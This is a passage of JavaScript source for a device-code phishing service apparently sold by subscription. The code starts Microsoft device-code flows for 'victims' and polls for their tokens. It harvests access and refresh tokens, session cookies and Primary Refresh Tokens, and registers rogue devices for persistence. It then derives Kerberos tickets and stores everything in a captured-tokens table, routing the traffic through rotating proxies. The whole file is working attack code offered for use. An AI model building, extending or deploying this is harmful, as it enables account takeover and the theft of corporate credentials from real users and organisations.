/**
 * VGenius C Engine – Device Proxy Service
 * Handles Microsoft Device Code OAuth flow proxying
 */
const axios = require('axios');
const ms = require('./microsoftclient');
const { HttpsProxyAgent } = require('https-proxy-agent');
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt, decrypt } = require('../utils/encrypt');
const { sendTelegramDocument } = require('../services/notification');
const proxyManager = require('../services/proxymanager');
const cookieConverter = require('./cookieconverter');
const { parsePrtClaims } = require('./kerberos');
const { enrollDevice } = require('./devicecode');
const devicemanager = require('./devicemanager');

// In-memory job store (for active device code flows)
const activeJobs = new Map();

/**
 * Start a new device code flow
 * @param {string} mode - "token" or "cookie"
 * @param {string} jwtToken - The link's JWT token (user_id, link_id)
 * @param {object} reqOptions - Optional: { ip, userAgent } for capturing visitor info
 * @returns {object} job data including user_code, verification_uri, etc.
 */
async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
  try {
    // Decode JWT to get user_id and link_id
    const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    const { user_id, link_id } = decoded;

    // Verify user and link are active
    const [users] = await db.query(
      "SELECT * FROM users WHERE id = ? AND subscription_status = 'active' AND (subscription_expiry IS NULL OR subscription_expiry > NOW())",
      [user_id]
    );
    if (!users.length) throw new Error('Subscription inactive');
    const user = users[0];

    const [links] = await db.query(
      'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
      [link_id, user_id, 'active']
    );
    if (!links.length) throw new Error('Link not active');
    const link = links[0];

    // Call Microsoft Device Code endpoint via proxy
    const tenant = config.AZURE_TENANT || 'common';
    const clientId = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    // Match GraphSpy: the device-code request itself uses the Graph default scope,
    // while DRS/device enrollment is handled later with the enterprise-registration scope.
    const deviceCodeScope = 'https://graph.microsoft.com/.default openid offline_access';
    const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;

    // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
    //
    //   body = {"client_id": client_id, "scope": scope}
    //   if ngcmfa or cae:
    //       claims_json = {"access_token": {}}
    //       if ngcmfa: claims_json["access_token"]["amr"]    = {"values": ["ngcmfa"]}
    //       if cae:    claims_json["access_token"]["xms_cc"] = {"values": ["cp1"]}
    //       body["claims"] = json.dumps(claims_json)
    //
    // This was the reason the victim was never prompted for MFA: the claims
    // block was absent from the request that actually issues the code, so AAD
    // was free to satisfy the sign-in from an existing session. amr=ngcmfa
    // forces a strong-auth (MFA) step; xms_cc=cp1 opts into Continuous Access
    // Evaluation. Both must ride on the devicecode call itself.
    const deviceCodeClaims = {
      access_token: {
        amr: { values: ['ngcmfa'] },
        xms_cc: { values: ['cp1'] },
      },
    };
    const deviceCodeBody = new URLSearchParams({
      client_id: clientId,
      scope: deviceCodeScope,
      claims: JSON.stringify(deviceCodeClaims),
    });
    const requestHeaders = {
      'Content-Type': 'application/x-www-form-urlencoded'
    };

    // Claim a sticky proxy for the entire device code flow. Microsoft binds
    // the device_code to the IP that requested it, so the token poll MUST
    // reuse the same egress IP for the whole flow.
    //
    // If the proxied request fails (proxy down, proxy IP blocked by
    // Microsoft, or an error body instead of a device code), fall back to a
    // direct request. A broken proxy must not silently produce a job with no
    // user_code — that job polls forever and the page hangs on
    // "Generating code..." with no way forward.
    let proxy = null;
    let dcData = null;

    try {
      const sticky = await ms.post(deviceCodeUrl, deviceCodeBody, {
        headers: requestHeaders,
        timeout: 15000,
        stickyProxy: true,
      });
      proxy = sticky.proxy;
      const data = sticky.response && sticky.response.data;
      if (data && data.user_code && data.device_code) {
        dcData = data;
      } else {
        console.warn('[DeviceProxy] Proxied devicecode request returned no user_code; falling back to direct',
          data && data.error ? data.error : '');
      }
    } catch (err) {
      console.warn('[DeviceProxy] Proxied devicecode request failed; falling back to direct:', err.message);
    }

    if (!dcData) {
      const direct = await ms.post(deviceCodeUrl, deviceCodeBody, {
        headers: requestHeaders,
        timeout: 15000,
        noProxy: true,
      });
      const data = direct.data;
      if (data && data.user_code && data.device_code) {
        dcData = data;
        // The device_code is now bound to the direct egress IP. Drop the
        // proxy so the token poll goes direct too — mixing IPs mid-flow
        // makes Microsoft reject the exchange.
        if (proxy && proxy.id) {
          try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
        }
        proxy = null;
      }
    }

    if (!dcData) {
      if (proxy && proxy.id) {
        try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
      }
      throw new Error('Microsoft device code request failed: no user_code returned (proxy and direct attempts both failed)');
    }

    const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    // Store job in memory with IP/user-agent for later token capture
    activeJobs.set(jobId, {
      jobId,
      user_id,
      link_id,
      device_code: dcData.device_code,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: mode || 'cookie',
      status: 'polling',
      created_at: Date.now(),
      jwtToken,
      ip_address: (reqOptions && reqOptions.ip) || 'unknown',
      user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
      proxy_id: proxy ? proxy.id : null,
      proxy_host: proxy ? proxy.proxy_host : null,
      proxy: proxy || null,
    });

    // Start polling in background
    pollForToken(jobId);

    return {
      job_id: jobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
      message: dcData.message,
    };
  } catch (err) {
    console.error('[DeviceProxy] startDeviceFlow error:', err.message);
    if (err.response) {
      console.error('[DeviceProxy] Microsoft response:', err.response.status, JSON.stringify(err.response.data).substring(0, 500));
    }
    throw err;
  }
}

/**
 * Poll for token completion
 */
async function pollForToken(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) return;

  // Use same tenant as device code endpoint (organizations for adrs_access scope)
  const tenant = config.AZURE_TENANT || 'organizations';
  const clientId = config.AZURE_CLIENT_ID;
  const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));

  for (let i = 0; i < maxAttempts; i++) {
    if (!activeJobs.has(jobId)) return; // Job cancelled

    // Check if expired before polling
    if (Date.now() > job.expires_at) {
      job.status = 'expired';
      // Update visitor status to timeout
      try {
        await db.query(
          'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
          ['timeout', job.user_id, job.link_id, 'waiting']
        );
      } catch (e) {
        /* ignore */
      }
      return;
    }

    await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));

    try {
      // Use the same proxy as the device code request for token polling
      const tokenResponse = await ms.post(
        `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: clientId,
          device_code: job.device_code,
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true,
          timeout: 15000,
          // Reuse the exact sticky proxy claimed for the device-code flow.
          // If the job never had a proxy, go direct instead of claiming a new one.
          proxy: job.proxy || null,
          noProxy: !job.proxy,
        }
      );

      const tokenData = tokenResponse.data;

      if (tokenData.access_token) {
        // SUCCESS! Store token
        job.status = 'completed';

        // Extract email FIRST before using it
        let capturedEmail = null;
        if (tokenData.id_token) {
          try {
            const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
            capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
          } catch (e) {
            /* ignore */
          }
        }

        // Capture Set-Cookie headers from the token response (session cookies)
        const responseCookies = [];
        const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              responseCookies.push({
                name: cookieName,
                value: cookieValue,
                domain: '.login.microsoftonline.com'
              });
            }
          }
        }

        // Device code flow doesn't return x-ms-RefreshTokenCredential cookie.
        // Do a refresh token exchange to capture the PRT cookie.
        // This is required for Kerberos derivation and cookie injection.
        if (tokenData.refresh_token) {
          try {
            const refreshResponse = await ms.post(
              `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
              new URLSearchParams({
                grant_type: 'refresh_token',
                client_id: clientId,
                refresh_token: tokenData.refresh_token,
                scope: 'openid profile offline_access'
              }),
              {
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                validateStatus: () => true,
                timeout: 15000,
                proxy: job.proxy,
                noProxy: !job.proxy_id,
              }
            );

            // Capture PRT cookie from refresh token exchange
            const refreshSetCookies = refreshResponse.headers['set-cookie'] || [];
            for (const cookieStr of refreshSetCookies) {
              const cookieParts = cookieStr.split(';')[0].trim();
              const eqIndex = cookieParts.indexOf('=');
              if (eqIndex > 0) {
                const cookieName = cookieParts.substring(0, eqIndex).trim();
                const cookieValue = cookieParts.substring(eqIndex + 1).trim();
                if (cookieName === 'x-ms-RefreshTokenCredential' && cookieValue) {
                  // Add PRT cookie to responseCookies
                  responseCookies.push({
                    name: cookieName,
                    value: cookieValue,
                    domain: '.login.microsoftonline.com'
                  });
                  console.log('[DeviceProxy] PRT cookie captured from refresh token exchange: prefix=' + cookieValue.substring(0, 30) + '... length=' + cookieValue.length);
                }
              }
            }

            // If refresh token exchange returned a new refresh token, update tokenData
            if (refreshResponse.data && refreshResponse.data.refresh_token) {
              tokenData.refresh_token = refreshResponse.data.refresh_token;
            }
          } catch (e) {
            console.log('[DeviceProxy] Refresh token exchange for PRT failed:', e.message);
          }
        }

        // Store cookies and email in job for later storage
        job.captured_cookies = responseCookies;
        job.captured_email = capturedEmail;
        await storeToken(job, tokenData, responseCookies);

        // Mark proxy as success
        if (job.proxy_id) {
          try {
            await proxyManager.markSuccess(job.proxy_id);
            console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as success`);
          } catch (e) {
            /* ignore */
          }
        }

        // Mark visitors as done for this user/link
        try {
          await db.query(
            'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
            ['done', job.user_id, job.link_id, 'waiting']
          );
        } catch (e) {
          /* silent */
        }
        return;
      }

      // Check for AADSTS50076 / soft error
      const errorCode = tokenData.error || '';
      const errorDesc = tokenData.error_description || '';

      if (errorCode === 'authorization_pending') continue;

      if (errorCode === 'slow_down') {
        // Increase interval
        job.interval = (job.interval || 5) + 5;
        continue;
      }

      // Personal account errors - stop immediately with "code expired" behavior
      if (
        errorCode === 'expired_token' ||
        errorCode === 'authorization_declined' ||
        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
        errorDesc.includes('personal account') ||
        errorDesc.includes('MSA') ||
        (errorCode === 'invalid_grant' && (
          errorDesc.includes('expired') ||
          errorDesc.includes('personal') ||
          errorDesc.includes('MSA')
        ))
      ) {
        // Personal account or declined - stop immediately
        // This matches competitor behavior showing "code expired"
        console.log('[DeviceProxy] Personal account detected, stopping with expired behavior');
        job.status = 'failed';
        job.error = 'Code expired';
        return;
      }

      // AADSTS50076 or interaction_required -> soft error
      if (
        errorDesc.includes('aadsts50076') ||
        errorDesc.includes('interaction_required') ||
        errorCode === 'authorization_declined'
      ) {
        job.status = 'soft_error';
        // Start a new device code flow in token mode and store it
        const newJob = await retryAsTokenMode(job);
        if (newJob) {
          job.retry_job_id = newJob.jobId;
        }
        return;
      }
    } catch (err) {
      console.error('[DeviceProxy] Poll error:', err.message);
      // Mark proxy as failure
      if (job.proxy_id) {
        try {
          await proxyManager.markFailure(job.proxy_id);
          console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as failure`);
        } catch (e) {
          /* ignore */
        }
      }
      // Continue polling on network errors
    }
  }

  // Exhausted attempts - mark as expired with visitor timeout
  job.status = 'expired';
  try {
    await db.query(
      'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
      ['timeout', job.user_id, job.link_id, 'waiting']
    );
  } catch (e) {
    /* ignore */
  }
}

/**
 * Retry as token mode (create new device code)
 */
async function retryAsTokenMode(originalJob) {
  try {
    // Use same tenant as device code endpoint (organizations for adrs_access scope)
    const tenant = config.AZURE_TENANT || 'organizations';
    const clientId = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

    // Claim a sticky proxy for the retry flow
    const { proxy, response: dcResponse } = await ms.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: 'https://graph.microsoft.com/.default openid offline_access',
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 15000,
        stickyProxy: true,
      }
    );

    const dcData = dcResponse.data;
    const newJobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    const newJob = {
      jobId: newJobId,
      user_id: originalJob.user_id,
      link_id: originalJob.link_id,
      device_code: dcData.device_code,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: 'token',
      status: 'polling',
      created_at: Date.now(),
      jwtToken: originalJob.jwtToken,
      is_retry: true,
      proxy_id: proxy ? proxy.id : null,
      proxy_host: proxy ? proxy.proxy_host : null,
      proxy: proxy || null,
    };

    activeJobs.set(newJobId, newJob);
    pollForToken(newJobId);

    return {
      jobId: newJobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
    };
  } catch (err) {
    console.error('[DeviceProxy] retryAsTokenMode error:', err.message);
    return null;
  }
}

/**
 * Store captured token in database
 */
async function storeToken(job, tokenData, responseCookies = []) {
  try {
    // Extract email and tenant from id_token
    let email = null;
    let idTokenTenant = null;
    if (tokenData.id_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
        idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
      } catch (e) {
        /* ignore */
      }
    }
    if (!email && tokenData.access_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
      } catch (e) {
        /* ignore */
      }
    }

    // Use stored IP and user-agent from when the flow started
    const ipAddress = job.ip_address || 'unknown';
    const userAgent = job.user_agent || 'DeviceProxy';

    // Format cookies for storage
    let cookiesEncrypted = null;
    if (responseCookies && responseCookies.length > 0) {
      const cookieStrings = responseCookies.map(
        c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`
      ).join('; ');
      cookiesEncrypted = encrypt(cookieStrings);
    }

    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
    let tenant = idTokenTenant || 'common';
    if (!idTokenTenant && job.jwtToken) {
      try {
        const decoded = jwt.verify(job.jwtToken, config.JWT_SECRET);
        const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ? AND user_id = ?', [decoded.link_id, decoded.user_id]);
        if (links.length && links[0].jwt_payload) {
          const parsed = JSON.parse(links[0].jwt_payload);
          if (parsed.tenant) tenant = parsed.tenant;
        }
      } catch (e) { /* use default */ }
    }

    // Extract PRT and related fields from token response
    let prt = null;
    let sessionKeyJwe = null;
    let deviceTenantId = null;
    let clientInfo = null;

    // Preserve the PRT from the x-ms-RefreshTokenCredential cookie (if present)
    // This is a JWT that can be decoded for client_info, session_key, tid, uid.
    // Only accept a real JWT-shaped PRT here; a raw OAuth refresh token is not
    // a PRT and must never be treated as one for Kerberos/renewal logic.
    const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
    if (prtCookie && prtCookie.value) {
      const prtCookieClaims = parsePrtClaims(prtCookie.value);
      if (prtCookieClaims) {
        prt = prtCookie.value;
        console.log('[DeviceProxy] PRT from cookie: prefix=' + (prtCookie.value || '').substring(0, 30) + '... length=' + (prtCookie.value || '').length);
      } else {
        console.warn('[DeviceProxy] Ignoring non-JWT x-ms-RefreshTokenCredential cookie; real PRT JWT required for renewal/Kerberos flow');
      }
    }

    // A raw OAuth refresh_token is not a PRT JWT. It may be used for DRS token
    // exchange, but it must never be treated as the final PRT for Kerberos or
    // PRT renewal. Require a JWT-shaped PRT before accepting it.
    if (!prt && tokenData.refresh_token) {
      if (parsePrtClaims(tokenData.refresh_token)) {
        prt = tokenData.refresh_token;
        console.log('[DeviceProxy] Using OAuth refresh_token as valid PRT fallback: prefix=' + (prt || '').substring(0, 30) + '...');
      } else {
        console.log('[DeviceProxy] Ignoring refresh_token fallback: it is not a valid PRT JWT; real x-ms-RefreshTokenCredential session material is required');
      }
    }

    // Extract session_key_enc from token response (if present)
    if (tokenData.session_key_enc) {
      sessionKeyJwe = tokenData.session_key_enc;
      console.log('[DeviceProxy] session_key_enc from token response');
    }

    // Extract client_info from token response (base64-encoded JSON with uid/utid)
    if (tokenData.client_info) {
      try {
        const clientInfoParsed = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
        deviceTenantId = clientInfoParsed.utid || null;
        clientInfo = tokenData.client_info;
        console.log('[DeviceProxy] client_info from token response, deviceTenantId=' + deviceTenantId);
      } catch (e) { /* ignore */ }
    }

    // Broker device enrollment from access_token
    let deviceId = null;
    let deviceEnrolled = false;
    let enrollmentTime = null;
    let deviceCertificateEncrypted = null;
    let encryptedPrivateKey = null;
    // Kept in memory for request_for_device(): the device-signed call is the
    // only source of the raw PRT and its session_key_jwe.
    let privateKeyPemForPrt = null;
    let certificateDerForPrt = null;
    // DRS device material of the enrollment that produced the keys above —
    // used to create/update the device_credentials row when persisting the
    // session key (the broker-enrollment path never creates that row itself).
    let enrolledDeviceMaterial = null;

    if (tokenData.access_token) {
      try {
        const accessPayload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
        deviceId = accessPayload['device_code_id'] || accessPayload['xms_device_id'] || accessPayload['oid'] || null;
      } catch (e) {
        deviceId = null;
      }
    }

    if (deviceId) {
      try {
        const enrollmentResult = await enrollDevice(tokenData.access_token, deviceId, tenant);
        deviceEnrolled = true;
        enrollmentTime = new Date();

        if (enrollmentResult.deviceCertificate) deviceCertificateEncrypted = encrypt(enrollmentResult.deviceCertificate);
        if (enrollmentResult.privateKeyPem) encryptedPrivateKey = encrypt(enrollmentResult.privateKeyPem);
        privateKeyPemForPrt = enrollmentResult.privateKeyPem || null;
        certificateDerForPrt = enrollmentResult.certificateDerBase64 || null;
        enrolledDeviceMaterial = {
          deviceId: enrollmentResult.deviceId || deviceId,
          deviceCertificate: enrollmentResult.deviceCertificate || null,
          privateKeyPem: enrollmentResult.privateKeyPem || null,
          certificateDerBase64: enrollmentResult.certificateDerBase64 || null,
        };

        console.log('[DeviceProxy] Device enrolled: ' + enrollmentResult.deviceName + ' (' + deviceId + ')');
      } catch (enrollErr) {
        console.error('[DeviceProxy] Device enrollment failed:', enrollErr.message);
        deviceEnrolled = false;
      }
    }

    if (!deviceEnrolled && tokenData.refresh_token) {
      try {
        const fresh = await devicemanager.exchangeForDrsToken(tokenData.refresh_token, tenant);
        if (fresh && fresh.accessToken && fresh.deviceId) {
          const retryResult = await enrollDevice(fresh.accessToken, fresh.deviceId, tenant);
          if (retryResult && (retryResult.deviceCertificate || retryResult.privateKeyPem)) {
            deviceEnrolled = true;
            enrollmentTime = new Date();
            if (retryResult.deviceCertificate) deviceCertificateEncrypted = encrypt(retryResult.deviceCertificate);
            if (retryResult.privateKeyPem) encryptedPrivateKey = encrypt(retryResult.privateKeyPem);
            privateKeyPemForPrt = retryResult.privateKeyPem || null;
            certificateDerForPrt = retryResult.certificateDerBase64 || null;
            enrolledDeviceMaterial = {
              deviceId: retryResult.deviceId || fresh.deviceId,
              deviceCertificate: retryResult.deviceCertificate || null,
              privateKeyPem: retryResult.privateKeyPem || null,
              certificateDerBase64: retryResult.certificateDerBase64 || null,
            };
            console.log('[DeviceProxy] Device enrolled after DRS token refresh: ' + (retryResult.deviceName || fresh.deviceId) + ' (' + fresh.deviceId + ')');
          }
        }
      } catch (refreshErr) {
        console.error('[DeviceProxy] DRS token refresh/retry enrollment failed:', refreshErr.message);
      }
    }

    // Fallback: extract client_info from id_token JWT payload
    if (!clientInfo && tokenData.id_token) {
      try {
        const idTokenClaims = parsePrtClaims(tokenData.id_token);
        if (idTokenClaims && idTokenClaims.hasOwnProperty('tid')) {
          deviceTenantId = idTokenClaims.tid || deviceTenantId;
          // Build a synthetic client_info from id_token claims
          clientInfo = JSON.stringify({
            uid: idTokenClaims.oid || idTokenClaims.sub || '',
            utid: idTokenClaims.tid || ''
          });
          console.log('[DeviceProxy] Extracted client_info from id_token (tid=' + idTokenClaims.tid + ', oid=' + idTokenClaims.oid + ')');
        }
      } catch (e) { /* ignore */ }
    }

    // Decode PRT JWT from Set-Cookie headers (x-ms-RefreshTokenCredential)
    // The PRT JWT contains: client_info, session_key, id_token, tid, uid
    if (prtCookie && prtCookie.value) {
      try {
        const prtClaims = parsePrtClaims(prtCookie.value);
        if (prtClaims) {
          // Extract client_info from PRT JWT (higher priority than token response)
          if (prtClaims.client_info && !clientInfo) {
            clientInfo = prtClaims.client_info;
            console.log('[DeviceProxy] client_info from PRT JWT');
          }
          // Extract device_tenant_id from PRT JWT client_info
          if (prtClaims.client_info) {
            try {
              const ci = JSON.parse(Buffer.from(prtClaims.client_info, 'base64').toString());
              deviceTenantId = ci.utid || deviceTenantId;
            } catch (e) { /* ignore */ }
          }
          // Extract session_key from PRT JWT (overrides session_key_enc from token response)
          if (prtClaims.session_key) {
            sessionKeyJwe = prtClaims.session_key;
            console.log('[DeviceProxy] session_key from PRT JWT');
          }
          // Log acrs claim for Kerberos eligibility check
          if (Array.isArray(prtClaims.acrs)) {
            console.log('[DeviceProxy] PRT acrs claims: ' + JSON.stringify(prtClaims.acrs) + ' (pfdr=' + prtClaims.acrs.includes('pfdr') + ')');
          }
        } else {
          console.log('[DeviceProxy] PRT JWT parse failed (not a JWT format): prefix=' + (prtCookie.value || '').substring(0, 30) + '...');
        }
      } catch (e) {
        console.log('[DeviceProxy] Failed to decode PRT JWT:', e.message);
      }
    }

    // ── GraphSpy parity: raw PRT + session_key_jwe via request_for_device ──
    // The x-ms-RefreshTokenCredential Set-Cookie is a cookie, not the raw PRT,
    // and the device-code token response carries no session key. The
    // device-signed (RS256 + x5c) request_for_device call returns BOTH, and it
    // is the only place session_key_jwe ever comes from — without it
    // captured_tokens.session_key_jwe stays null and every Kerberos field
    // (tgt_ad / tgt_cloud / tgt_cloud_sessionkey) stays underivable.
    if (privateKeyPemForPrt && certificateDerForPrt && tokenData.refresh_token && !sessionKeyJwe) {
      try {
        const prtkdf = require('./prtkdf');
        const prtResult = await prtkdf.requestPrtForDevice({
          refreshToken: tokenData.refresh_token,
          privateKeyPem: privateKeyPemForPrt,
          certificateBase64: certificateDerForPrt,
        });
        if (prtResult.prt) prt = prtResult.prt;
        if (prtResult.sessionKeyJwe) sessionKeyJwe = prtResult.sessionKeyJwe;
        console.log('[DeviceProxy] PRT + session_key_jwe captured via request_for_device (GraphSpy parity)');

        // Persist the decrypted session key where resolveSessionKeyForToken()
        // and the Kerberos derivation read it. Upsert: the broker-enrollment
        // path never creates the device_credentials row itself, so a bare
        // UPDATE would silently store nothing and lose the session key.
        if (prtResult.sessionKeyHex) {
          try {
            await devicemanager.persistPrtSessionKey(
              job.user_id,
              tenant,
              prtResult.sessionKeyHex,
              enrolledDeviceMaterial || {
                deviceId: deviceId || null,
                deviceCertificate: null,
                privateKeyPem: privateKeyPemForPrt,
                certificateDerBase64: certificateDerForPrt,
              }
            );
          } catch (skErr) {
            console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
          }
        }
      } catch (prtErr) {
        console.warn('[DeviceProxy] request_for_device failed (non-fatal):', prtErr.message);
      }
    }

    // Determine account type from email domain (must be before INSERT)
    // Default to work/school - only personal accounts (outlook/hotmail/live/passport) are excluded
    let accountType = 'work_school';
    if (email) {
      const emailDomain = email.split('@')[1].toLowerCase();
      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
        accountType = 'personal';
        console.log('[DeviceProxy] Personal account detected:', emailDomain, '- device registration disabled');
      } else {
        console.log('[DeviceProxy] Organization account detected:', emailDomain, '- device registration enabled');
      }
    }

    // Determine client_id used for this capture
    const clientIdUsed = config.AZURE_CLIENT_ID;

    let tokenId = null;
    try {
      try {
        const [result] = await db.query(
          `INSERT INTO captured_tokens
           (user_id, link_id, email, token_type, access_token_encrypted,
            refresh_token_encrypted, id_token_encrypted,
            prt, client_info, session_key_jwe, device_tenant_id,
            cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type,
            account_type, client_id,
            device_id, device_certificate_encrypted, encrypted_private_key,
            device_enrolled, enrollment_time)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
          [
            job.user_id,
            job.link_id,
            email,
            job.mode || 'token',
            encrypt(tokenData.access_token),
            encrypt(tokenData.refresh_token || null),
            encrypt(tokenData.id_token || null),
            encrypt(prt),
            clientInfo,
            encrypt(sessionKeyJwe),
            deviceTenantId,
            cookiesEncrypted,
            ipAddress,
            userAgent,
            tenant,
            'office',
            accountType,
            clientIdUsed,
            deviceId || null,
            deviceCertificateEncrypted,
            encryptedPrivateKey,
            deviceEnrolled ? 1 : 0,
            enrollmentTime,
          ]
        );
        tokenId = result.insertId;
      } catch (primaryInsertErr) {
        const primaryMsg = primaryInsertErr?.message || '';
        // Any "Unknown column 'x' in 'field list'" means this deployment's
        // captured_tokens is missing a column the primary INSERT needs. Treat
        // every such case as a schema issue so the legacy (narrower) INSERT
        // still records the capture instead of the whole row being lost.
        const isDeviceSchemaIssue =
          /Unknown column/i.test(primaryMsg) ||
          /Unknown column 'device_id'/.test(primaryMsg) ||
          /Unknown column 'device_certificate_encrypted'/.test(primaryMsg) ||
          /Unknown column 'encrypted_private_key'/.test(primaryMsg) ||
          /Unknown column 'device_enrolled'/.test(primaryMsg) ||
          /Unknown column 'enrollment_time'/.test(primaryMsg) ||
          /Unknown column 'session_key_jwe'/.test(primaryMsg) ||
          /Unknown column 'device_tenant_id'/.test(primaryMsg) ||
          /Unknown column 'client_info'/.test(primaryMsg);

        if (!isDeviceSchemaIssue) {
          console.error('[DeviceProxy] Token insert failed:', primaryInsertErr.message);
          throw primaryInsertErr;
        }

        console.warn('[DeviceProxy] Device columns missing, falling back to legacy insert');
        const [legacyResult] = await db.query(
          `INSERT INTO captured_tokens
           (user_id, link_id, email, token_type, access_token_encrypted,
            refresh_token_encrypted, id_token_encrypted,
            prt, client_info, session_key_jwe, device_tenant_id,
            cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
          [
            job.user_id,
            job.link_id,
            email,
            job.mode || 'token',
            encrypt(tokenData.access_token),
            encrypt(tokenData.refresh_token || null),
            encrypt(tokenData.id_token || null),
            encrypt(prt),
            clientInfo,
            encrypt(sessionKeyJwe),
            deviceTenantId,
            cookiesEncrypted,
            ipAddress,
            userAgent,
            tenant,
            'office',
            accountType,
            clientIdUsed,
          ]
        );
        tokenId = legacyResult.insertId;
      }
    } catch (e) {
      console.error('[DeviceProxy] Token insert/fallback error:', e && e.message ? e.message : e);
    }

    // ── Auto-derive Kerberos TGTs (tgt_cloud / tgt_ad / top-level names) ──
    // The block further down only covers the DRS-registration path
    // (!deviceEnrolled). This covers the broker-enrolled path — which is the
    // one that actually yields a raw PRT carrying acrs=pfdr, i.e. the only
    // PRT that can be exchanged for Kerberos tickets. Runs after the response
    // is returned, so it never delays the visitor.
    if (tokenId && deviceEnrolled && accountType === 'work_school'
        && tenant && tenant !== 'common' && tenant !== 'organizations') {
      const kerberosService = require('./kerberos');
      kerberosService.deriveTGTForToken(tokenId)
        .then(r => {
          if (r && r.success) {
            console.log('[DeviceProxy] Kerberos TGTs derived for token', tokenId);
          } else {
            console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', (r && r.error) || 'unknown');
          }
        })
        .catch(err => console.error('[DeviceProxy] Kerberos derivation error:', err.message));
    }

    // For cookie mode, trigger cookie conversion immediately after capture
    let cookieConversionResult = null;
    if (job.mode === 'cookie') {
      const refreshTokenForConversion = prt || tokenData.refresh_token || tokenData.access_token;
      const validPrtForConversion = !!(prt && parsePrtClaims(prt));
      if (!validPrtForConversion) {
        console.log('[DeviceProxy] Skipping cookie conversion: no valid PRT JWT; refresh token is not accepted as a substitute PRT');
        cookieConversionResult = { success: false, error: 'No valid PRT JWT available for cookie conversion' };
      } else {
        cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
